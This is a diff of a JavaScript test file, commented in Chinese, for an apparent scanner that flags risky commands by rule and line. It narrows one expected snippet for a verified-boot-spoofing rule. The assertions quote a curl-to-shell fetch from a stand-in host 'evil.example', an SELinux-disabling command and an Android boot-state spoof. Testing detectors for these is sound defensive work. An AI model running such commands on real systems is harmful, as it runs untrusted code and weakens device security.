@@ -5074,7 +5074,8 @@ test('T4-A4 正面（工单 §3 A4）：命中行号落在 polyglot 条目自己
     .map((f) => [`${f.ruleId}@${f.line}`, f.snippet]));
   assert.equal(snip['PIPE_TO_SHELL@2'], 'curl -s https://evil.example/a | sh');
   assert.equal(snip['SELINUX_DISABLE@4'], 'setenforce 0');
-  assert.equal(snip['VERIFIED_BOOT_SPOOF@5'], 'resetprop ro.boot.verifiedbootstate green');
+  assert.equal(snip['VERIFIED_BOOT_SPOOF@5'], 'resetprop ro.boot.verifiedbootstate',
+    'VERIFIED_BOOT_SPOOF 的 snippet 是匹配段本身（值 `green` 不在匹配里），逐字钉住防渲染层改动');
 });
 
 // —— §3 反面 ——
